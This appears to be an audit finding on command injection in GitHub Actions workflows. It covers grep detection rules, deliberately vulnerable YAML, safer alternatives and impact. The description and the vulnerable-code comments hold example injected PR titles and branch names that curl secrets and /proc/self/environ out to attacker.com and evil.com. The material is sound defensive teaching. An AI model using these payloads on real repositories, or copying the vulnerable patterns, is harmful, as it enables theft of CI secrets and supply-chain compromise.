# OC-214: PR-Based Pipeline Command Injection

**Category:** Infrastructure
**Severity:** CRITICAL
**Auditors:** INFRA-02
**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
**OWASP:** A03:2021 - Injection

## Description

GitHub Actions workflows that use `pull_request_target` or consume user-controlled inputs (PR titles, branch names, issue bodies, commit messages) via `${{ }}` expression interpolation are vulnerable to command injection. When untrusted data is interpolated directly into a `run:` block, the CI runner executes it as shell code. An attacker simply opens a PR or issue with a malicious title like `"; curl http://attacker.com?t=${{ secrets.TOKEN }}; echo "` to exfiltrate secrets.

This vulnerability class is known as "Poisoned Pipeline Execution" (PPE). The March 2025 tj-actions/changed-files supply chain attack exploited this exact pattern, initially targeting Coinbase before spreading to 23,000+ repositories. The attack modified the GitHub Action's code to dump CI runner memory and exfiltrate all secrets. CVE-2025-53104 (CVSS 9.1) in gluestack-ui demonstrated the same pattern where a malicious GitHub Discussion title enabled arbitrary command execution on the GHA runner.

The `pull_request_target` trigger is particularly dangerous because it runs in the context of the base repository (with its secrets) but processes data from the fork's PR. This means an external contributor can trigger execution with access to all repository secrets.

## Detection

```
# Search for pull_request_target trigger
grep -rn "pull_request_target" **/.github/workflows/*.yml

# Search for unsafe interpolation of user-controlled inputs
grep -rn "\${{.*github.event.pull_request.title" **/.github/workflows/*.yml
grep -rn "\${{.*github.event.issue.title" **/.github/workflows/*.yml
grep -rn "\${{.*github.event.comment.body" **/.github/workflows/*.yml
grep -rn "\${{.*github.event.pull_request.body" **/.github/workflows/*.yml
grep -rn "\${{.*github.head_ref" **/.github/workflows/*.yml
grep -rn "\${{.*github.event.*.head.ref" **/.github/workflows/*.yml

# Search for direct interpolation in run blocks
grep -B5 -A5 "run:" **/.github/workflows/*.yml | grep "\${{.*github.event"
```

## Vulnerable Code

```yaml
# .github/workflows/greet.yml
name: Greet PR Author
on:
  pull_request_target:
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Greet
        run: |
          # CRITICAL: PR title is attacker-controlled
          echo "Thanks for PR: ${{ github.event.pull_request.title }}"
          # Attacker PR title: "; curl http://evil.com?s=${GITHUB_TOKEN}; echo "

      - name: Process branch
        run: |
          # Branch name is attacker-controlled
          git checkout ${{ github.head_ref }}
          # Attacker branch name: ;curl http://evil.com?s=$(cat /proc/self/environ);
```

```yaml
# Also vulnerable: workflow_run, issue_comment, issues triggers
on:
  issues:
    types: [opened]
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: |
          TITLE="${{ github.event.issue.title }}"
          if echo "$TITLE" | grep -q "bug"; then
            gh issue edit ${{ github.event.issue.number }} --add-label bug
          fi
```

## Secure Code

```yaml
# .github/workflows/greet.yml
name: Greet PR Author
on:
  pull_request_target:
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Greet
        # Pass user input via environment variable, not direct interpolation
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
        run: |
          # Environment variable is NOT interpolated as shell code
          echo "Thanks for your PR, ${PR_AUTHOR}!"
          # Use GitHub Actions output instead of inline echo
          echo "pr_title=${PR_TITLE}" >> "$GITHUB_OUTPUT"

      - name: Process with actions/github-script (no shell)
        uses: actions/github-script@v7
        with:
          script: |
            // JavaScript context - no shell injection possible
            const title = context.payload.pull_request.title;
            await github.rest.issues.createComment({
              ...context.repo,
              issue_number: context.payload.pull_request.number,
              body: `Thanks for your PR: ${title}`
            });
```

## Impact

An attacker who exploits pipeline command injection can:
- Exfiltrate all repository secrets (deploy keys, API tokens, cloud credentials)
- Modify the repository's code by pushing to protected branches
- Access private packages and registries
- Compromise downstream supply chain (publish malicious versions)
- Access any service the CI runner can reach
- Persist by modifying workflow files themselves

## References

- CVE-2025-53104: gluestack-ui GitHub Actions command injection (CVSS 9.1, July 2025)
- CVE-2025-54416: tj-actions/branch-names command injection
- CVE-2026-25761: super-linter command injection
- tj-actions/changed-files supply chain attack (March 2025, 23,000+ repos affected)
- Unit 42: GitHub Actions Supply Chain Attack targeting Coinbase
- Semgrep: Command Injection in GitHub Actions documentation
- GitHub Security Lab: GHSL-2024-320/321 - PPE in Eclipse repositories
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
